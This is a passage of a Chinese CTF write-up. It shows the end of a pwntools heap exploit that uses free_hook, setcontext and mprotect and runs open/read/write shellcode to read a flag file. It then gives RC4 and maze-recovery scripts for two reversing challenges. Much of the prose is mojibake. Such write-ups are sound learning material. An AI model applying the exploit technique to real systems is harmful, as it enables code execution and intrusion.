shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>free_hook<span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span>
shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>free_hook<span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span>
sc <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>set_context<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sig<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> sc
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

sc_addr <span class="token operator">=</span> free_hook <span class="token operator">+</span> <span class="token number">0x28</span>
<span class="token comment"># gdb.attach(sh, "b *$rebase(0x00000000000280C)\nc\n")</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>mprotect <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sc_addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>sc_addr <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x12</span> <span class="token operator">+</span> sc<span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>mprotect <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sc_addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>sc_addr <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>mprotect <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sc_addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>sc_addr <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>mprotect <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'a'</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>mprotect <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>set_context <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>set_context <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


tmp <span class="token operator">=</span> replace0<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>sig<span class="token punctuation">)</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0xaf</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0xae</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0xa7</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0xa6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x8f</span><span class="token operator">-</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x77</span><span class="token operator">-</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>

edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x6f</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x6e</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x68</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token triple-quoted-string string">'''
edit(0,tmp[:0x6f])
edit(0,tmp[:0x6e])
edit(0,tmp[:0x67])
edit(0,tmp[:0x66])
for i in range(0x6):
    edit(0,tmp[:0x5f-i])
for i in range(0x16):
    edit(0,tmp[:0x48-i])
for i in range(0x3):
    edit(0,tmp[:0x31-i])
for i in range(0x24):
    edit(0,tmp[:0x24-i])
'''</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
ti<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<h3 id="re1-crackme2-apk1"><a class="header-anchor" href="#re1-crackme2-apk1">Â¶</a>re1_crackme2_apk1</h3>
<p>è¿™é¢˜è€æ—©å°±å‡ºäº†ï¼Œæœ‰ä¸ªå‡½æ•°ç”¨è‡ªå·±çš„äº†ï¼Œå’Œé¢˜ç›®æœ‰ç‚¹åŒºåˆ«ï¼Œå¯¼è‡´flagä¸€ç›´ä¸å¯¹ï¼Œåé¢è¿‡äº†å¥½ä¹…æ‰ååº”è¿‡æ¥ï¼Œç—›å¤±ä¸€è¡€ã€‚</p>
<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b0b096768b028daddb86db220d88a65a860854a1.png" srcset="/img/loading.gif" lazyload alt="å›¾ç‰‡.png"></p>
<p>encodeå‡½æ•°</p>
<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-392b97a055c674c08bce2ff0307b0d5cf86adbf3.png" srcset="/img/loading.gif" lazyload alt="å›¾ç‰‡.png"><br>
æ˜æ˜¾çš„RC4ç‰¹å¾ï¼Œç›´æ¥è·‘å­˜å¥½çš„è„šæœ¬</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import base64
def rc4_main(key &#x3D; &quot;init_key&quot;, message &#x3D; &quot;init_message&quot;):
    print(&quot;RC4è§£å¯†ä¸»å‡½æ•°è°ƒç”¨æˆåŠŸ&quot;)
    print(&#39;\n&#39;)
    s_box &#x3D; rc4_init_sbox(key)
    crypt &#x3D; rc4_excrypt(message, s_box)
    return crypt
    
def rc4_init_sbox(key):
    s_box &#x3D; list(range(256)) 
    print(&quot;åŸæ¥çš„ s ç›’ï¼š%s&quot; % s_box)
    print(&#39;\n&#39;)
    j &#x3D; 0
    for i in range(256):
        j &#x3D; (j + s_box[i] + ord(key[i % len(key)])) % 256
        s_box[i], s_box[j] &#x3D; s_box[j], s_box[i]
    print(&quot;æ··ä¹±åçš„ s ç›’ï¼š%s&quot;% s_box)
    print(&#39;\n&#39;)
    return s_box
    
def rc4_excrypt(plain, box):
    print(&quot;è°ƒç”¨è§£å¯†ç¨‹åºæˆåŠŸã€‚&quot;)
    print(&#39;\n&#39;)
    plain &#x3D; base64.b64decode(plain.encode(&#39;utf-8&#39;))
    plain &#x3D; bytes.decode(plain)
    res &#x3D; []
    i &#x3D; j &#x3D; 0
    for s in plain:
        i &#x3D; (i + 1) % 256
        j &#x3D; (j + box[i] + 136) % 256
        box[i], box[j] &#x3D; box[j], box[i]
        t &#x3D; (box[i] + box[j]) % 256
        k &#x3D; box[t]
        res.append(chr(ord(s) ^ k))
    print(&quot;resç”¨äºè§£å¯†å­—ç¬¦ä¸²ï¼Œè§£å¯†åæ˜¯ï¼š%res&quot; %res)
    print(&#39;\n&#39;)
    cipher &#x3D; &quot;&quot;.join(res)
    print(&quot;è§£å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š%s&quot; %cipher)
    print(&#39;\n&#39;)
    print(&quot;è§£å¯†åçš„è¾“å‡º(æ²¡ç»è¿‡ä»»ä½•ç¼–ç ):&quot;)
    print(&#39;\n&#39;)
    return  cipher

# # target &#x3D; [205, &#39;R&#39;, &#39;t&#39;, &#39;z&#39;, 30, &#39;\b&#39;, &#39;\b&#39;, 224, &#39;W&#39;, &#39;;&#39;, 24, 153, 175, &#39;&#x3D;&#39;, 29, 148, 21, &#39;%&#39;, &#39;g&#39;, &#39;[&#39;, &#39;d&#39;, &#39;S&#39;, 31, &#39;;&#39;, 220, 162, &#39;F&#39;, &#39;6&#39;, 211, 253, 190, &#39;3&#39;]
# target &#x3D; [205, 82,  116, 122, 30,  8,     8,  224,  87, 59,  24, 153, 175, 61,  29, 148, 21, 37,   103, 91, 100,  83, 31, 59,  220, 162, 70,  54,  211, 253, 190, 51]
# for i in range(len(target)):
#     print(hex(target[i]))
# print(target)
0xcd,0x52,0x74,0x7a,0x1e,0x8,0x8,0xe0,0x57,
0x3b,0x18,0x99,0xaf,0x3d,0x1d,0x94,0x15,0x25,
0x67,0x5b,0x64,0x53,0x1f,0x3b,0xdc,0xa2,0x46,
0x36,0xd3,0xfd,0xbe,0x33
a&#x3D;[0xcd,0x52,0x74,0x7a,0x1e,0x8,0x8,0xe0,0x57,
0x3b,0x18,0x99,0xaf,0x3d,0x1d,0x94,0x15,0x25,
0x67,0x5b,0x64,0x53,0x1f,0x3b,0xdc,0xa2,0x46,
0x36,0xd3,0xfd,0xbe,0x33]
s&#x3D;&quot;&quot;
for i in a:
    s+&#x3D;chr(i)

s&#x3D;str(base64.b64encode(s.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;)

rc4_main(&quot;happygame&quot;, s)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<h3 id="re3-meikyu2"><a class="header-anchor" href="#re3-meikyu2">Â¶</a>re3_meikyu2</h3>
<p>æ˜¯ä¸ªpythonæ–‡ä»¶ï¼Œ<a target="_blank" rel="noopener" href="http://xn--main-kf5f3se02y.py">ç»™äº†ä¸ªmain.py</a> ä¸€ä¸ªdata ä¸€ä¸ªdll å’Œpydæ–‡ä»¶ã€‚è®²çœŸç¬¬ä¸€æ¬¡çœ‹è§pydï¼Œé€»è¾‘ä¸éš¾æ‡‚ã€‚</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> mylib<span class="token punctuation">.</span>pyd
<span class="token keyword">from</span> mylib<span class="token punctuation">.</span>pyd <span class="token keyword">import</span> CheckStatus <span class="token keyword">as</span> CS<span class="token punctuation">,</span> START<span class="token punctuation">,</span> END<span class="token punctuation">,</span> WALL<span class="token punctuation">,</span> ROAD
<span class="token keyword">import</span> os

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Missing file: data'</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    map_ <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    cipher <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">b'suta-to'</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i<span class="token punctuation">,</span> ch <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>map_<span class="token punctuation">)</span><span class="token punctuation">:</span>
        map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> ch <span class="token operator">^</span> cipher<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">(</span>START<span class="token punctuation">,</span> END<span class="token punctuation">,</span> WALL<span class="token punctuation">,</span> ROAD<span class="token punctuation">)</span><span class="token punctuation">:</span>
            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    key <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'Input key:'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">match</span> mylib<span class="token punctuation">.</span>check<span class="token punctuation">(</span>map_<span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">case</span> CS<span class="token punctuation">.</span>FAIL<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Wrong key'</span><span class="token punctuation">)</span>
        <span class="token keyword">case</span> CS<span class="token punctuation">.</span>SUCCESS<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Congratulations!!! Your flag is: `flag&#123;md5(key)&#125;`'</span><span class="token punctuation">)</span>
        <span class="token keyword">case</span> CS<span class="token punctuation">.</span>ERROR_CIPHER_LEN <span class="token operator">|</span> CS<span class="token punctuation">.</span>ERROR_DATA_LEN <span class="token operator">|</span> CS<span class="token punctuation">.</span>ERROR_FMT <span class="token operator">|</span> CS<span class="token punctuation">.</span>FATAL_ERROR<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Something wrong, can you figure out?'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Bye~'</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<p>ç½‘ä¸Šå¯¼å…¥pydçš„æ–¹å¼éƒ½è¯•è¿‡äº†ï¼Œæ²¡åŠæ³•æˆåŠŸå¯¼å…¥è¿™ä¸ªmylibã€‚æ‰€ä»¥å¯¹å…¶ä¸­çš„ä¸€äº›å‡½æ•°åªèƒ½idaé€†å‘ï¼Œè€Œä¸å¤ªèƒ½è°ƒè¯•åˆ†æã€‚<br>
ç­”é¢˜çš„æµç¨‹æ˜¯åˆ¶ä½œä¸€ä¸ªmapï¼Œç„¶åç”¨checkå‡½æ•°æ£€æŸ¥ã€‚<br>
é¢˜ç›®ç»™äº†æç¤ºæ˜¯æ·±åº¦ä¼˜å…ˆç®—æ³•ã€‚</p>
<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d99fa8c6867f6465e6ebe8bfc9054111af65dce7.png" srcset="/img/loading.gif" lazyload alt="å›¾ç‰‡.png"></p>
<p>101*101çš„è¿·å®«ã€‚<br>
å°è¯•æ¢å¤è¿·å®«</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># import mylib</span>
<span class="token comment"># from mylib import CheckStatus as CS, START, END, WALL, ROAD</span>
<span class="token keyword">import</span> os

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Missing file: data'</span><span class="token punctuation">)</span>
                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
        
        map_ <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        cipher <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">b'suta-to'</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> i<span class="token punctuation">,</span> ch <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>map_<span class="token punctuation">)</span><span class="token punctuation">:</span>
                map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> ch <span class="token operator">^</span> cipher<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">]</span>
                <span class="token keyword">if</span> map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">83</span><span class="token punctuation">:</span>
                        map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'S'</span>
                <span class="token keyword">elif</span> map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">35</span><span class="token punctuation">:</span>
                        map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0'</span>
                <span class="token keyword">elif</span> map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">:</span>
                        map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'1'</span>
                <span class="token keyword">elif</span> map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">69</span><span class="token punctuation">:</span>
                        map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'X'</span>
                <span class="token comment"># if map_[i] not in (START, END, WALL, ROAD):</span>
                <span class="token comment">#         exit(0)</span>
        <span class="token comment"># print(map_)</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span>map_<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">101</span><span class="token operator">+</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
        <span class="token comment">#print(map_)</span>
        <span class="token comment"># key = input('Input key:').encode()</span>
        <span class="token comment"># match mylib.check(map_, list(key)):</span>
        <span class="token comment">#         case CS.FAIL:</span>
        <span class="token comment">#                 print('Wrong key')</span>
        <span class="token comment">#         case CS.SUCCESS:</span>
        <span class="token comment">#                 print('Congratulations!!! Your flag is: `flag&#123;md5(key)&#125;`')</span>
        <span class="token comment">#         case CS.ERROR_CIPHER_LEN | CS.ERROR_DATA_LEN | CS.ERROR_FMT | CS.FATAL_ERROR:</span>
        <span class="token comment">#                 print('Something wrong, can you figure out?')</span>
        <span class="token comment"># print('Bye~')</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
        main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<p>çœŸçš„è¡€äºï¼Œè¿™é‡Œ</p>
<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fcb1cbf827d5de3bd60ccc30fdd49a51f3322b94.png" srcset="/img/loading.gif" lazyload alt="å›¾ç‰‡.png"><br>
å½“æ—¶å†™äº†i*100ï¼Œä¸ä»…æ²¡æ‹¿åˆ°äºŒè¡€ï¼Œè¿˜æ²¡åšå‡ºæ¥ã€‚ã€‚ã€‚ã€‚ã€‚</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
S1011111111111111111111111111111111101111101111101110111110101011111111111111101010101011101110111010
01010100010100000000000001000101000001000001000001000100000101010000000100000001010101010001000100010
01110111010111111101110101110101011111110101110101111111110111111111110101011111111111111101010101010
00010101000100000001000100000000010000000101000101000000000100010000000001010000000000000001010101010
01110101011111111111010111011101011111111111111111110101110101010101010101111101010111110111111111110
00010000000101010100010100010001010001000001000000000101000101000101010101000001010100000100000000000
01111111110101010111111101110101111101111101111111110101111111110101110111111101010101010111110101110
01010100000001000100010001000101000001000000000001000101000001000101000100000001010101010100000101000
01010111010111011111011101110111111101110111010111010111110101111111111111010101010111010111110111010
00010100010001000100010001000100000000000100010000010100000100010001010100010101010100010100000001010
01110101011111110101111111011111111111111111111111111111010111010101010111111111111111010111110111010
01010001000101000100010100010000010101000000010101010000010100000100000000010101010100010100000001010
01011111110101110101110111111111010101111111010101010101011111111111111111010101010111111111010101110
01010100010101000000010101010000010001010100000001000101010001000100000101000000000101010100010101000
01010111010101110111110101011111011101010111110101111111111101110111110101111101111101010111111111110
01000100000001000001010101010000000001000101000100000001010000000001000001000000010101010100010101010
01011111110111111101010101011111110111110101111111111101011111111101111101110111110101010111010101010
01010101010101010100010000010100000001000001010001010000010100000001000000000001010000010100000000010
